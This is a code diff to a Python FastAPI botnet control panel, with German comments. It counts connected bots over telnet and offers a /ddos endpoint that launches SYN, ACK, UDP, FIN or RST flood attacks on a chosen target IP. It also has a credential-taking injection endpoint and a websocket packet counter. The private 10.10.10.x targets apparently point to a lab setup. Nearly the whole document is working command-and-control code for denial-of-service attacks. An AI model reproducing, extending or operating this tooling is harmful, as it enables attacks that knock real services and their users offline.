@@ -75,7 +75,6 @@ async def count_connected_bots():
         if not telnet_session_started:
             start_telnet_session()
             telnet_session_started = True
-            sleep(12) 
 
         bot_count = get_bot_count_from_all_windows()
         return JSONResponse(content={"message": f"{bot_count}"}, status_code=200)
@@ -83,10 +82,20 @@ async def count_connected_bots():
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Error retrieving bot count: {str(e)}")
 
+current_ddos_params = {}
+
+
+PROTOCOL_MAPPING = {
+    "syn": "TCP",
+    "ack": "TCP",
+    "udp": "UDP",
+    "fin": "TCP",
+    "rst": "TCP"
+}
 
 
 @app.get("/ddos")
-async def start_ddos_attack(type: str = Query(...), duration: int = Query(...), target: str = Query(...)):
+async def start_ddos_attack(attack_type: str = Query(...), duration: int = Query(...), target: str = Query(...)):
     """
     This endpoint handles DDoS attack requests.
     Expects three parameters: type, duration, and target.
@@ -99,11 +108,14 @@ async def start_ddos_attack(type: str = Query(...), duration: int = Query(...), 
         if duration <= 0:
             raise HTTPException(status_code=400, detail="Duration must be a positive integer.")
         
-        
+        protocol = PROTOCOL_MAPPING.get(attack_type.lower(), "UNKNOWN")  # Standardwert "UNKNOWN", falls nicht gefunden
+        print(f"Mapped attack type to protocol {protocol}")
+        global current_ddos_params 
+        current_ddos_params = {"protocol": protocol, "duration": duration, "target": target}
 
-        attack_message = threading.Thread(target=ddos_attack_service, args=(type, duration, target))
+        attack_message = threading.Thread(target=ddos_attack_service, args=(attack_type, duration, target))
         attack_message.start()        
-        return JSONResponse(content={"message": f"Started DDoS attack of type {type} on {target} for {duration} seconds."}, status_code=200)
+        return JSONResponse(content={"message": f"Started DDoS attack of type {attack_type} on {target} for {duration} seconds."}, status_code=200)
     
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Error initiating DDoS attack: {str(e)}")
@@ -136,8 +148,6 @@ async def start_inject(username: str = Query(...), password: str = Query(...), i
         raise HTTPException(status_code=500, detail=f"Error initiating Injection: {str(e)}")
     
 
-
-
 from packet_counter_service import get_packet_count,start_sniffing
 
 @app.websocket("/ws/packet_count")
@@ -145,14 +155,34 @@ async def count_packets(websocket: WebSocket):
     """WebSocket-Verbindung zur Live-Übertragung der Paketanzahl"""
     await websocket.accept()
 
-    # Sniffing erst starten, wenn der erste Client verbindet
-    sniffing_thread = threading.Thread(target=start_sniffing, daemon=True)
+    # Warte auf gültige DDoS-Parameter
+    max_wait_time = 10  # Maximal 10 Sekunden warten
+    wait_interval = 0.5  # Alle 500ms prüfen
+
+    for _ in range(int(max_wait_time / wait_interval)):
+        if "protocol" in current_ddos_params and "target" in current_ddos_params:
+            protocol = current_ddos_params["protocol"]
+            target_ip = current_ddos_params["target"]
+            if protocol and target_ip:
+                break  # Werte sind gültig, also Schleife beenden
+        await asyncio.sleep(wait_interval)
+    else:
+        # Falls nach 10 Sekunden keine gültigen Werte vorhanden sind, abbrechen
+        await websocket.send_json({"error": "DDoS parameters not set in time"})
+        return
+
+    tcp_flag = protocol[0].upper()
+    print(f"Sniffing using IP Target: {target_ip}")
+
+    # Sniffing starten
+    sniffing_thread = threading.Thread(target=start_sniffing, args=(protocol, target_ip, tcp_flag), daemon=True)
     sniffing_thread.start()
 
     while True:
         await asyncio.sleep(1)  # Update jede Sekunde
         packet_count = get_packet_count()
         await websocket.send_json({"packet_count": packet_count})
+
 
 @app.websocket("/ws/{endpoint}")
 async def start_scanning(websocket: WebSocket, endpoint: str):
@@ -217,6 +247,13 @@ async def background_tasks():
 
     for endpoint in clients_by_endpoint:
         asyncio.create_task(process_output_queue(endpoint))
+
+    global telnet_session_started
+    start_telnet_session()
+    telnet_session_started = True
+    sleep(7)
+
+
 
 async def process_output_queue(endpoint):
     """
@@ -347,10 +384,10 @@ async def get():
                     let ws;
                     const type = prompt("Enter attack type (e.g., SYN flood):", "syn");
                     const duration = prompt("Enter duration (in seconds):", "20");
-                    const target = prompt("Enter target IP address (e.g., 10.10.10.20):", "10.10.10.174");
+                    const target = prompt("Enter target IP address (e.g., 10.10.10.169):", "10.10.10.169");
 
                     // Make HTTP GET request to start DDoS
-                    const url = `/ddos?type=${encodeURIComponent(type)}&duration=${encodeURIComponent(duration)}&target=${encodeURIComponent(target)}`;
+                    const url = `/ddos?attack_type=${encodeURIComponent(type)}&duration=${encodeURIComponent(duration)}&target=${encodeURIComponent(target)}`;
 
                     fetch(url)
                         .then(response => response.json())
